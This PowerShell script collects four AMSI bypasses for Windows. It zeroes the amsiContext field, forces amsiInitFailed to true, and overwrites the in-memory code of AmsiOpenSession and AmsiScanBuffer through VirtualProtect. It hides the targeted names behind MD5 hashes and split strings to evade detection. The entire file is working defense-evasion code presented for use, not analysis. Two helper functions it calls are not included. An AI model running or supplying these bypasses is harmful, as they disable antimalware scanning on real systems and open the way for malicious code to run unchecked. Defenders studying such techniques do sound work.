<#
    Small collection of AMSI bypasses
#>

function GetMd5 {
    Param([string]$name)
    return (([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($name)) | ForEach-Object { "{0:x2}" -f $_ }) -join ""
}

## Patching amsiContext

$auto = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals("System.Management.Automation.dll")})

$auto.GetTypes() | ForEach {
    $h = GetMd5 $_.Name       ## AmsiUtils
    if ($h -eq 'f649290befeae1b1ca9c5ee8cda5285d') {
        $_.GetFields('NonPublic,Static') | ForEach {
            $h = GetMd5 $_.Name   ## amsiContext
            if ($h -eq '784be95a86ddfc8adf9acd2a8fb35d53') {
                [System.Runtime.InteropServices.Marshal]::Copy([Int32[]]@(0), 0, [IntPtr]$_.GetValue($null), 1)
            }
        }
    }
}


## Patching amsiInitFailed

$auto.GetTypes() | ForEach {
    $h = GetMd5 $_.Name
    if ($h -eq 'f649290befeae1b1ca9c5ee8cda5285d') {
        $_.GetFields('NonPublic,Static') | ForEach {
            $h = GetMd5 $_.Name
            if ($h -eq 'ac201fdb093bdd5797e7acea7e55caa2') {
                $_.SetValue($null, $true)
            }
        }
    }
}


## Patching AmsiOpenSession, depends on the two reflective functions: ResolveAddr and PrepareApi

[IntPtr]$addr_opensess = ResolveAddr "amsi.dll" "AmsiOpenSession"
$protect = PrepareApi (ResolveAddr "kernel32.dll" "VirtualProtect") ([bool]) @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())

[Byte[]]$overwrite = @(0x48, 0x31, 0xC0) 
$old_protect = 0
$protect.Invoke($addr_opensess, 1024, 0x04, [ref]$old_protect)
[System.Runtime.InteropServices.Marshal]::Copy($overwrite, 0, $addr_opensess, 3)
$protect.Invoke($addr_opensess, 1024, $old_protect, [ref]$old_protect)


## The usual patching AmsiScanBuffer

$n = @("Am", "siSc", "anBuf", "fer") -join ""
[IntPtr]$addr_scan = ResolveAddr "amsi.dll" $n
$protect = PrepareApi (ResolveAddr "kernel32.dll" "VirtualProtect") ([bool]) @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())


[Byte[]]$overwrite = @(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

$old_protect = 0
$protect.Invoke($addr_scan, 6, 0x40, [ref]$old_protect)
[System.Runtime.InteropServices.Marshal]::Copy($overwrite, 0, $addr_scan, 6)
$protect.Invoke($addr_scan, 6, $old_protect, [ref]$old_protect)